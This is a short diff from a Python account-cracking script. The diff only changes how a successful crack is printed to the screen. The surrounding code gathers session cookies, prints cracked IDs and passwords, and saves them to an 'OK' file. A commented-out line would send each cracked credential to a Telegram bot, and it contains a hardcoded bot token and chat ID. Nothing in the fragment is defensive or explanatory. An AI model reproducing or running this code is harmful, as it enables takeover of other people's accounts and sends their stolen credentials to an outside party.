@@ -1357,7 +1357,7 @@ def crack(idf,pwv):
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				
 				#requests.get(f"https://api.telegram.org/bot6025762213:AAH29kD1LrMDsjG4lBzGgVl6kT4dV0OaoUY/sendMessage?chat_id=1396443240&text=\r {idf} | {pw}")
-				print(f'\r\x1b[1;90m[RAWA-OK]\x1b[1;91m   {idf} | \x1b[0;96m{pw} | \x1b[0;34m{kuki}')
+				print(f'\r{x}{B}EMAIL    :  {H}{idf} \n{m}PASSWORD : {N} {pw}\n')
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				cek_apk(session,coki)
 				break
